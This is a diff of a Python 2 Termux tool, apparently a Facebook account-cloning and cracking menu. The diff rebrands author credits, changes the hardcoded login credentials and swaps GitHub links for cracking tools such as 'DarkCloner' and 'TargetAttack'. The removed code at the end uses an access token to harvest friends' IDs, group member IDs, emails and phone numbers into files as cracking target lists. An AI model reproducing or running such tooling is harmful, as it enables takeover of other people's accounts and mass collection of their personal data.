@@ -1,6 +1,6 @@
 #!/usr/bin/python2
 #coding=utf-8
-#The Credit For This Code Goes To lovehacker
+#The Credit For This Code Goes To Arbab Ali Memon
 #If You Wanna Take Credits For This Code, Please Look Yourself Again...
 #Reserved2020
 
@@ -55,7 +55,7 @@ S='\033[1;96m'
 P='\033[1;95m'
 Y='\033[1;93m'
 
-#Dev:love_hacker
+#Dev:Arbab_Ali
 ##### LOGO #####
 logo = """
 \033[1;93m██████╗░██╗░░░░░░█████╗░░█████╗░██╗░░██╗
@@ -848,9 +848,9 @@ print  """
 \033[1;91m██║╚██╔╝██║██╔══██║██╔══╝░░██║██╔══██║
 \033[1;91m██║░╚═╝░██║██║░░██║██║░░░░░██║██║░░██║
 \033[1;91m╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═╝░░╚═╝
-\033[1;95m«-----------------\033[1;91mBlackMafia\033[1;95m-----------------»"""
+\033[1;95m«-----------------\033[1;91mCyberHacker\033[1;95m-----------------»"""
 jalan("\033[1;92m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠋⠉⠀⠀⠀⠀⠉⠉⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ")
-jalan("\033[1;92m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠉\033[1;95m⠀ BlackMafia⠀\033[1;92m⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ")
+jalan("\033[1;92m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠉\033[1;95m⠀ ArbabMemon⠀\033[1;92m⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ")
 jalan("\033[1;92m⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ")
 jalan("\033[1;92m⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣆⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ") 
 jalan("\033[1;92m⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⡏⠀⠀⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ")
@@ -861,15 +861,15 @@ jalan("\033[1;92m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⣴⣿⠋⠀⠀⠀⠀⠀⣿⠇
 jalan("\033[1;92m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣿⣿⣶⣶⣶⣶⣶⣶⣿⣷⣶⣦⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ")
 jalan("\033[1;92m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ")                                                                                                                                                                                                                                                          
 jalan("\033[1;93m ▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇")
-jalan("\033[1;93m▇▇\033[1;95m           WellCome to BlackMafia     \033[1;93m▇▇")
-jalan("\033[1;93m▇▇\033[1;91m             👇Tool Using Tips👇      \033[1;93m▇▇")
-jalan("\033[1;93m▇▇\033[1;92m            Tool Update EveryDay      \033[1;93m▇▇")
-jalan("\033[1;93m▇▇\033[1;92m        Termux Data Clear EveryDay    \033[1;93m▇▇")
-jalan("\033[1;93m▇▇\033[1;92m         WhatsApp  Num 03094161457    \033[1;93m▇▇")
+jalan("\033[1;93m▇▇\033[1;95m           WellCome to CyberHacking     \033[1;93m▇▇")
+jalan("\033[1;93m▇▇\033[1;91m             👇 Arbab Ali Memon 👇      \033[1;93m▇▇")
+jalan("\033[1;93m▇▇\033[1;92m            Contact Me 03003023263      \033[1;93m▇▇")
+jalan("\033[1;93m▇▇\033[1;92m        Termux Data Clear Every Day     \033[1;93m▇▇")
+jalan("\033[1;93m▇▇\033[1;92m         WhatsApp  Number03003023263    \033[1;93m▇▇")
 jalan("\033[1;93m ▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇")
-print "\033[1;95m«-----------------\033[1;91mBlackMafia\033[1;95m-----------------»"
-CorrectUsername = "Black"
-CorrectPassword = "Mafia"
+print "\033[1;95m«-----------------\033[1;91mArbabMemon\033[1;95m-----------------»"
+CorrectUsername = "Hacker"
+CorrectPassword = "Arbab"
 
 loop = 'true'
 while (loop == 'true'):
@@ -1100,11 +1100,11 @@ def pilih():
                 jalan('\033[1;96mpkg install git')
                 jalan('\033[1;96mpip2 install requests')
                 jalan('\033[1;96mpip2 install mechanize') 
-                jalan("\033[1;96mgit clone https://github.com/lovehacker404/World")
-                jalan('\033[1;96mcd World')
-                jalan('\033[1;96mpython2 Cloning.py')
-                jalan('\033[1;96mUser:Black')
-                jalan('\033[1;96mpass:Mafia')
+                jalan("\033[1;96mgit clone https://github.com/ShahzadaArbab/TheHero")
+                jalan('\033[1;96mcd TheHero')
+                jalan('\033[1;96mpython2 Arbab.py')
+                jalan('\033[1;96mUser:Hacker')
+                jalan('\033[1;96mpass:Arbab')
                 jalan('\033[1;92m👆Copy Command & send 2 groups👆')
                 jalan('\033[1;91mYoutube Chenal Like Subscrib plzz')
                 jalan('\033[1;92m⭕No2⭕')
@@ -1115,11 +1115,11 @@ def pilih():
                 jalan('\033[1;91mpkg install git')
                 jalan('\033[1;91mpip2 install requests')
                 jalan('\033[1;91mpip2 install mechanize')
-                jalan('\033[1;91mgit clone https://github.com/lovehacker404/WorldCloning/')
-                jalan('\033[1;91mcd WorldCloning')
-                jalan('\033[1;91mpython2 World.py')
-                jalan('\033[1;91mUser Name : World')
-                jalan('\033[1;91mPassword   : lovehacker')
+                jalan('\033[1;91mgit clone https://github.com/ArbabMemon/Hacker/')
+                jalan('\033[1;91mcd Hacker')
+                jalan('\033[1;91mpython2 Hacker.py')
+                jalan('\033[1;91mUser Name : Hacker')
+                jalan('\033[1;91mPassword   : Arbab')
                 jalan('\033[1;97m⭕No3⭕')
                 jalan('\033[1;91mpkg update')
                 jalan('\033[1;91mpkg upgrade')
@@ -1128,11 +1128,11 @@ def pilih():
                 jalan('\033[1;91mpkg install git')
                 jalan('\033[1;91mpip2 install requests')
                 jalan('\033[1;91mpip2 install mechanize')
-                jalan('\033[1;91mgit clone https://github.com/lovehacker404/Cobra')
-                jalan('\033[1;91mcd Cobra')
-                jalan('\033[1;91mpython2 Scorpion.py')
-                jalan('\033[1;91mUser Name :  Cobra')
-                jalan('\033[1;91mPassword: lovehacker')
+                jalan('\033[1;91mgit clone https://github.com/TheArbab/Shahzada')
+                jalan('\033[1;91mcd Shahzada')
+                jalan('\033[1;91mpython2 Arbab.py')
+                jalan('\033[1;91mUser Name :  Shahzada')
+                jalan('\033[1;91mPassword: Arbab')
                 jalan('\033[1;96m⭕No4⭕')
                 jalan('\033[1;91mpkg update')
                 jalan('\033[1;91mpkg upgrade')
@@ -1141,9 +1141,9 @@ def pilih():
                 jalan('\033[1;91mpkg install git')
                 jalan('\033[1;91mpip2 install requests')
                 jalan('\033[1;91mpip2 install mechanize')
-                jalan('\033[1;91mgit clone https://github.com/lovehacker404/lov3Hak3r/')
-                jalan('\033[1;91mcd lov3Hak3r')
-                jalan('\033[1;91mpython2 lovehacker.py')
+                jalan('\033[1;91mgit clone https://github.com/ShahzadaArbab/Rebel/')
+                jalan('\033[1;91mcd Rebel')
+                jalan('\033[1;91mpython2 Arbab.py')
                 jalan('\033[1;95m⭕No5⭕')
                 jalan('\033[1;91mpkg update')
                 jalan('\033[1;91mpkg upgrade')
@@ -1152,11 +1152,11 @@ def pilih():
                 jalan('\033[1;91mpkg install git')
                 jalan('\033[1;91mpip2 install requests')
                 jalan('\033[1;91mpip2 install mechanize')
-                jalan('\033[1;91mgit clone https://github.com/lovehacker404/BlackMafia2020/')
-                jalan('\033[1;91mcd BlackMafia2020')
-                jalan('\033[1;91mpython2 lovehacker')
-                jalan('\033[1;91mUser Name:Corona')
-                jalan('\033[1;91mPassword  :lovehacker')
+                jalan('\033[1;91mgit clone https://github.com/TheArbab/YoungTiger/')
+                jalan('\033[1;91mcd YoungTiger')
+                jalan('\033[1;91mpython2 Arbab.py')
+                jalan('\033[1;91mUser Name:YoungTiger')
+                jalan('\033[1;91mPassword  :Arbab')
                 jalan('\033[1;94m⭕No6⭕')
                 jalan('\033[1;91mpkg update ')
                 jalan('\033[1;91mpkg upgrade')
@@ -1165,11 +1165,11 @@ def pilih():
                 jalan('\033[1;91mpkg install git')
                 jalan('\033[1;91mpip2 install requests')
                 jalan('\033[1;91mpip2 install mechanize')
-                jalan('\033[1;91mgit clone https://github.com/lovehacker404/CoviD-19/')
-                jalan('\033[1;91mcd CoviD-19')
-                jalan('\033[1;91mpython2 Virus.py')
-                jalan('\033[1;91mUser Name: Corona')
-                jalan('\033[1;91mpasword: lovehacker')
+                jalan('\033[1;91mgit clone https://github.com/TheArbab/Don/')
+                jalan('\033[1;91mcd Don')
+                jalan('\033[1;91mpython2 Arbab.py')
+                jalan('\033[1;91mUser Name: Don')
+                jalan('\033[1;91mpasword: Arbab')
                 jalan('\033[1;93m⭕No7⭕')
                 jalan('\033[1;91mpkg update ')
                 jalan('\033[1;91mpkg upgrade')
@@ -1177,11 +1177,11 @@ def pilih():
                 jalan('\033[1;91mpkg install git ')
                 jalan('\033[1;91mpip2 install mechanize ')
                 jalan('\033[1;91mpip2 install requests')
-                jalan('\033[1;91mgit clone https://github.com/lovehacker404/Dragon/')
-                jalan('\033[1;91mcd Dragon')
-                jalan('\033[1;91mpython2 lovehacker.py')
-                jalan('\033[1;91mUserName:  Dragon')
-                jalan('\033[1;91mPassword:  lovehacker')
+                jalan('\033[1;91mgit clone https://github.com/TheArbab/Speedi/')
+                jalan('\033[1;91mcd Speedi')
+                jalan('\033[1;91mpython2 Arbab.py')
+                jalan('\033[1;91mUserName:  Speedi')
+                jalan('\033[1;91mPassword:  Arbab')
                 jalan('\033[1;92m⭕No8⭕')
                 jalan('\033[1;91mpkg update')
                 jalan('\033[1;91mpkg upgrade')
@@ -1190,11 +1190,11 @@ def pilih():
                 jalan('\033[1;91mpkg install git')
                 jalan('\033[1;91mpip2 install requests')
                 jalan('\033[1;91mpip2 install mechanize')
-                jalan('\033[1;91mgit clone https://github.com/lovehacker404/KaliIndia/')
-                jalan('\033[1;91mcd KaliIndia')
-                jalan('\033[1;91mpython2 kalilinux.India.py')
-                jalan('\033[1;91mUser Name: India')
-                jalan('\033[1;91mPassword:lovehacker')
+                jalan('\033[1;91mgit clone https://github.com/TheArbab/Bangladesh/')
+                jalan('\033[1;91mcd Bangladesh')
+                jalan('\033[1;91mpython2 Arbab.py')
+                jalan('\033[1;91mUser Name: Bangladesh')
+                jalan('\033[1;91mPassword:Arbab')
                 jalan('\033[1;97m⭕No9⭕')
                 jalan('\033[1;91mpkg update')
                 jalan('\033[1;91mpkg upgrade')
@@ -1203,23 +1203,23 @@ def pilih():
                 jalan('\033[1;91mpkg install git')
                 jalan('\033[1;91mpip2 install requests')
                 jalan('\033[1;91mpip2 install mechanize')
-                jalan('\033[1;91mgit clone https://github.com/lovehacker404/Testing')
-                jalan('\033[1;91mcd Testing')
-                jalan('\033[1;91mpython2 Project.py')
-                jalan('\033[1;91mUser Name: Testing')
-                jalan('\033[1;91mpasword: lovehacker')
+                jalan('\033[1;91mgit clone https://github.com/ShahzadaArbab/DarkCloner')
+                jalan('\033[1;91mcd DarkCloner')
+                jalan('\033[1;91mpython2 Arbab.py')
+                jalan('\033[1;91mUser Name: Darkfb')
+                jalan('\033[1;91mpasword: Arbab')
                 jalan('\033[1;96m⭕No10⭕')
-                jalan('\033[1;91mgit clone https://github.com/lovehacker404/Target.Atack/')
-                jalan('\033[1;91mcd Target.Atack')
+                jalan('\033[1;91mgit clone https://github.com/TheArbab/TargetAttack/')
+                jalan('\033[1;91mcd TargetAttack')
                 jalan('\033[1;91mls')
                 jalan('\033[1;91mcat README.md')
-                jalan('\033[1;91mchmod +x Target.py')
+                jalan('\033[1;91mchmod +x Arbab.py')
                 jalan('\033[1;91mls')
                 jalan('\033[1;91mnano password.txt')
                 jalan('\033[1;91mls')
                 jalan('\033[1;91mpwd')
-                jalan('\033[1;91mstorage file location password.txt')
-                jalan('\033[1;91mpython2 Target.py')
+                jalan('\033[1;91mstorage file location Arbabali.txt')
+                jalan('\033[1;91mpython2 Arbab.py')
                 jalan('\033[1;95m⭕No11⭕')
                 jalan('\033[1;91mapt update')
                 jalan('\033[1;91mapt upgrade')
@@ -1228,9 +1228,9 @@ def pilih():
                 jalan('\033[1;91mpip2 install requests')
                 jalan('\033[1;91mpip2 install mechanize')
                 jalan('\033[1;91mpkg install git')
-                jalan('\033[1;91mgit clone https://github.com/lovehacker404/fblite')
-                jalan('\033[1;91mcd fblite')
-                jalan('\033[1;91mpython2 Crack.py')
+                jalan('\033[1;91mgit clone https://github.com/TheArbab/CyberHacker')
+                jalan('\033[1;91mcd CyberHacker')
+                jalan('\033[1;91mpython2 Arbab.py')
                 jalan('\033[1;94m⭕No12⭕')
                 jalan('\033[1;91mpkg update')
                 jalan('\033[1;91mpkg upgrade')
@@ -1239,11 +1239,11 @@ def pilih():
                 jalan('\033[1;91mpkg install git')
                 jalan('\033[1;91mpip2 install requests')
                 jalan('\033[1;91mpip2 install mechanize')
-                jalan('\033[1;91mgit clone https://github.com/lovehacker404/india/')
-                jalan('\033[1;91mcd india')
-                jalan('\033[1;91mpython2 india.py')
-                jalan('\033[1;91mUser name. KashmirBanyGa')
-                jalan('\033[1;91mpasword.Pakistan')
+                jalan('\033[1;91mgit clone https://github.com/TheArbab/IranAttack/')
+                jalan('\033[1;91mcd IranAttack')
+                jalan('\033[1;91mpython2 Arbab.py')
+                jalan('\033[1;91mUser name. Iran')
+                jalan('\033[1;91mpasword.Arbab')
                 jalan('\033[1;93m⭕No13⭕')
                 jalan('\033[1;91mpkg install python2 ')
                 jalan('\033[1;91mpip2 install mechanize ')
@@ -3755,564 +3755,4 @@ def id_friends():
             os.system('clear')
             print logo11
             print 52 * '\x1b[1;95m\xe2\x95\x90'
-            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
-            z = json.loads(r.text)
-            save_id = raw_input('\x1b[1;91m[+] \x1b[1;92mSave File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
-            bz = open(save_id, 'w')
-            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
-            print 52 * '\x1b[1;97m\xe2\x95\x90'
-            for ah in z['data']:
-                idfriends.append(ah['id'])
-                bz.write(ah['id'] + '\n')
-                print '\r\x1b[1;96mName\x1b[1;91m  :\x1b[1;97m ' + ah['name']
-                print '\x1b[1;91mID   \x1b[1;91m : \x1b[1;97m' + ah['id']
-                print 52 * '\x1b[1;97m\xe2\x95\x90'
-
-            print '\n\r\x1b[1;91m[+] \x1b[1;97mTotal ID \x1b[1;96m%s' % len(idfriends)
-            print '\x1b[1;91m[+] \x1b[1;97mFile Save \x1b[1;91m: \x1b[1;97m' + save_id
-            bz.close()
-            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
-            asif()
-        except IOError:
-            print '\x1b[1;91m[!] Error when creating file'
-            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
-            asif()
-        except (KeyboardInterrupt, EOFError):
-            print '\x1b[1;91m[!] Stopped'
-            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
-            menu()
-        except KeyError:
-            os.remove(save_id)
-            print '\x1b[1;91m[!] An error occurred'
-            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
-            asif()
-        except requests.exceptions.ConnectionError:
-            print '\x1b[1;91m[\xe2\x9c\x96] No connection'
-            keluar()
-
-
-def idfrom_friends():
-    os.system('clear')
-    try:
-        toket = open('login.txt', 'r').read()
-    except IOError:
-        print '\x1b[1;91m[!] Token not found'
-        os.system('rm -rf login.txt')
-        time.sleep(1)
-        login()
-    else:
-        try:
-            os.system('clear')
-            print logo6
-            print 52 * '\x1b[1;97m\xe2\x95\x90'
-            idt = raw_input('\x1b[1;91m[+] \x1b[1;92mInput ID Friends \x1b[1;91m: \x1b[1;97m')
-            try:
-                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
-                op = json.loads(jok.text)
-                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mFrom\x1b[1;91m :\x1b[1;97m ' + op['name']
-            except KeyError:
-                print '\x1b[1;91m[!] Not be friends'
-                raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
-                asif()
-
-            r = requests.get('https://graph.facebook.com/' + idt + '?fields=friends.limit(5000)&access_token=' + toket)
-            z = json.loads(r.text)
-            save_idt = raw_input('\x1b[1;91m[+] \x1b[1;92mType File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
-            bz = open(save_idt, 'w')
-            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mplzz wi8 \x1b[1;97m...')
-            print 52 * '\x1b[1;97m\xe2\x95\x90'
-            for ah in z['friends']['data']:
-                idfromfriends.append(ah['id'])
-                bz.write(ah['id'] + '\n')
-                print '\r\x1b[1;92mName\x1b[1;91m  :\x1b[1;97m ' + ah['name']
-                print '\x1b[1;92mID   \x1b[1;91m : \x1b[1;97m' + ah['id']
-                print 52 * '\x1b[1;97m\xe2\x95\x90'
-
-            print '\n\r\x1b[1;91m[+] \x1b[1;97mTotal ID \x1b[1;96m%s' % len(idfromfriends)
-            print '\x1b[1;91m[+] \x1b[1;97mFile Save \x1b[1;91m: \x1b[1;97m' + save_idt
-            bz.close()
-            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
-            menu()
-        except IOError:
-            print '\x1b[1;91m[!] Error when creating file'
-            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
-            asif()
-        except (KeyboardInterrupt, EOFError):
-            print '\x1b[1;91m[!] Stopped'
-            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
-            menu()
-        except requests.exceptions.ConnectionError:
-            print '\x1b[1;91m[\xe2\x9c\x96] No connection'
-            keluar()
-
-
-def id_member_grup():
-    os.system('clear')
-    try:
-        toket = open('login.txt', 'r').read()
-    except IOError:
-        print '\x1b[1;91m[!] Token not found'
-        os.system('rm -rf login.txt')
-        time.sleep(1)
-        login()
-    else:
-        try:
-            os.system('clear')
-            print logo12
-            print 52 * '\x1b[1;97m\xe2\x95\x90'
-            id = raw_input('\x1b[1;91m[+] \x1b[1;92mID grup \x1b[1;91m:\x1b[1;97m ')
-            try:
-                r = requests.get('https://graph.facebook.com/group/?id=' + id + '&access_token=' + toket)
-                asw = json.loads(r.text)
-                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName group \x1b[1;91m:\x1b[1;97m ' + asw['name']
-            except KeyError:
-                print '\x1b[1;91m[!] Group not found'
-                raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
-                asif()
-
-            simg = raw_input('\x1b[1;91m[+] \x1b[1;97mSave File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
-            b = open(simg, 'w')
-            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mplzz wi8 \x1b[1;97m...')
-            print 52 * '\x1b[1;97m\xe2\x95\x90'
-            re = requests.get('https://graph.facebook.com/' + id + '/members?fields=name,id&access_token=' + toket)
-            s = json.loads(re.text)
-            for i in s['data']:
-                idmem.append(i['id'])
-                b.write(i['id'] + '\n')
-                print '\r\x1b[1;92mName\x1b[1;91m  :\x1b[1;97m ' + i['name']
-                print '\x1b[1;92mID  \x1b[1;91m  :\x1b[1;97m ' + i['id']
-                print 52 * '\x1b[1;97m\xe2\x95\x90'
-
-            print '\n\r\x1b[1;91m[+] \x1b[1;97mTotal ID \x1b[1;96m%s' % len(idmem)
-            print '\x1b[1;91m[+] \x1b[1;97mFile saved \x1b[1;91m: \x1b[1;97m' + simg
-            b.close()
-            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
-            asif()
-        except IOError:
-            print '\x1b[1;91m[!] Error when creating file'
-            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
-            menu()
-        except (KeyboardInterrupt, EOFError):
-            print '\x1b[1;91m[!] Stopped'
-            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
-            asif()
-        except KeyError:
-            os.remove(simg)
-            print '\x1b[1;91m[!] Group not found'
-            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
-            menu()
-        except requests.exceptions.ConnectionError:
-            print '\x1b[1;91m[\xe2\x9c\x96] No connection'
-            keluar()
-
-
-def email():
-    os.system('clear')
-    try:
-        toket = open('login.txt', 'r').read()
-    except IOError:
-        print '\x1b[1;91m[!] Token not found'
-        os.system('rm -rf login.txt')
-        time.sleep(1)
-        login()
-    else:
-        try:
-            os.system('clear')
-            print logo13
-            print 52 * '\x1b[1;97m\xe2\x95\x90'
-            mails = raw_input('\x1b[1;91m[+] \x1b[1;92mSave File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
-            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
-            a = json.loads(r.text)
-            mpsh = open(mails, 'w')
-            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
-            print 52 * '\x1b[1;97m\xe2\x95\x90'
-            for i in a['data']:
-                x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + toket)
-                z = json.loads(x.text)
-                try:
-                    em.append(z['email'])
-                    mpsh.write(z['email'] + '\n')
-                    print '\r\x1b[1;92mName\x1b[1;91m  :\x1b[1;97m ' + z['name']
-                    print '\x1b[1;92mEmail\x1b[1;91m : \x1b[1;97m' + z['email']
-                    print 52 * '\x1b[1;97m\xe2\x95\x90'
-                except KeyError:
-                    pass
-
-            print '\n\r\x1b[1;91m[+] \x1b[1;97mTotal Email\x1b[1;96m%s' % len(em)
-            print '\x1b[1;91m[+] \x1b[1;97mFile saved \x1b[1;91m: \x1b[1;97m' + mails
-            mpsh.close()
-            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
-            asif()
-        except IOError:
-            print '\x1b[1;91m[!] Error when creating file'
-            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
-            asif()
-        except (KeyboardInterrupt, EOFError):
-            print '\x1b[1;91m[!] Stopped'
-            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
-            asif()
-        except KeyError:
-            os.remove(mails)
-            print '\x1b[1;91m[!] An error occurred'
-            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
-            asif()
-        except requests.exceptions.ConnectionError:
-            print '\x1b[1;91m[\xe2\x9c\x96] No connection'
-            keluar()
-
-
-def emailfrom_friends():
-    os.system('clear')
-    try:
-        toket = open('login.txt', 'r').read()
-    except IOError:
-        print '\x1b[1;91m[!] Token not found'
-        os.system('rm -rf login.txt')
-        time.sleep(1)
-        login()
-    else:
-        try:
-            os.system('clear')
-            print logo19
-            print 52 * '\x1b[1;97m\xe2\x95\x90'
-            idt = raw_input('\x1b[1;91m[+] \x1b[1;92mInput ID Friends \x1b[1;91m: \x1b[1;97m')
-            try:
-                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
-                op = json.loads(jok.text)
-                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mFrom\x1b[1;91m :\x1b[1;97m ' + op['name']
-            except KeyError:
-                print '\x1b[1;91m[!] Not be friends'
-                raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
-                asif()
-
-            mails = raw_input('\x1b[1;91m[+] \x1b[1;92mSave File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
-            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
-            a = json.loads(r.text)
-            mpsh = open(mails, 'w')
-            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
-            print 52 * '\x1b[1;97m\xe2\x95\x90'
-            for i in a['data']:
-                x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + toket)
-                z = json.loads(x.text)
-                try:
-                    emfromfriends.append(z['email'])
-                    mpsh.write(z['email'] + '\n')
-                    print '\r\x1b[1;92mName\x1b[1;91m  :\x1b[1;95m ' + z['name']
-                    print '\x1b[1;92mEmail\x1b[1;91m : \x1b[1;96m' + z['email']
-                    print 52 * '\x1b[1;97m\xe2\x95\x90'
-                except KeyError:
-                    pass
-
-            print '\n\r\x1b[1;91m[+] \x1b[1;97mTotal Email\x1b[1;96m%s' % len(emfromfriends)
-            print '\x1b[1;91m[+] \x1b[1;97mFile saved \x1b[1;91m: \x1b[1;97m' + mails
-            mpsh.close()
-            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
-            asif()
-        except IOError:
-            print '\x1b[1;91m[!] Error when creating file'
-            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
-            asif()
-        except (KeyboardInterrupt, EOFError):
-            print '\x1b[1;91m[!] Stopped'
-            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
-            asif()
-        except requests.exceptions.ConnectionError:
-            print '\x1b[1;91m[\xe2\x9c\x96] No connection'
-            keluar()
-
-
-def nomor_hp():
-    os.system('clear')
-    try:
-        toket = open('login.txt', 'r').read()
-    except IOError:
-        print '\x1b[1;91m[!] Token not found'
-        os.system('rm -rf login.txt')
-        time.sleep(1)
-        login()
-    else:
-        try:
-            os.system('clear')
-            print logo14
-            print 52 * '\x1b[1;97m\xe2\x95\x90'
-            noms = raw_input('\x1b[1;91m[+] \x1b[1;92mSave File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
-            url = 'https://graph.facebook.com/me/friends?access_token=' + toket
-            r = requests.get(url)
-            z = json.loads(r.text)
-            no = open(noms, 'w')
-            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
-            print 52 * '\x1b[1;97m\xe2\x95\x90'
-            for n in z['data']:
-                x = requests.get('https://graph.facebook.com/' + n['id'] + '?access_token=' + toket)
-                z = json.loads(x.text)
-                try:
-                    hp.append(z['mobile_phone'])
-                    no.write(z['mobile_phone'] + '\n')
-                    print '\r\x1b[1;92mName\x1b[1;91m  :\x1b[1;95m ' + z['name']
-                    print '\x1b[1;92mPhone\x1b[1;91m : \x1b[1;96m' + z['mobile_phone']
-                    print 52 * '\x1b[1;97m\xe2\x95\x90'
-                except KeyError:
-                    pass
-
-            print '\n\r\x1b[1;91m[+] \x1b[1;97mTotal Phone\x1b[1;96m%s' % len(hp)
-            print '\x1b[1;91m[+] \x1b[1;97mFile saved \x1b[1;91m: \x1b[1;97m' + noms
-            no.close()
-            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
-            asif()
-        except IOError:
-            print '\x1b[1;91m[!] Error when creating file'
-            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
-            asif()
-        except (KeyboardInterrupt, EOFError):
-            print '\x1b[1;91m[!] Stopped'
-            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
-            asif()
-        except KeyError:
-            os.remove(noms)
-            print '\x1b[1;91m[!] An error occurred '
-            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
-            asif()
-        except requests.exceptions.ConnectionError:
-            print '\x1b[1;91m[\xe2\x9c\x96] No connection'
-            keluar()
-
-
-def hpfrom_friends():
-    os.system('clear')
-    try:
-        toket = open('login.txt', 'r').read()
-    except IOError:
-        print '\x1b[1;91m[!] Token not found'
-        os.system('rm -rf login.txt')
-        time.sleep(1)
-        login()
-    else:
-        try:
-            os.system('clear')
-            print logo18
-            print 52 * '\x1b[1;97m\xe2\x95\x90'
-            idt = raw_input('\x1b[1;91m[+] \x1b[1;92mInput Friends ID \x1b[1;91m: \x1b[1;97m')
-            try:
-                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
-                op = json.loads(jok.text)
-                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mFrom\x1b[1;91m :\x1b[1;97m ' + op['name']
-            except KeyError:
-                print '\x1b[1;91m[!] Not be friends'
-                raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
-                asif()
-
-            noms = raw_input('\x1b[1;91m[+] \x1b[1;95mSave File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
-            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
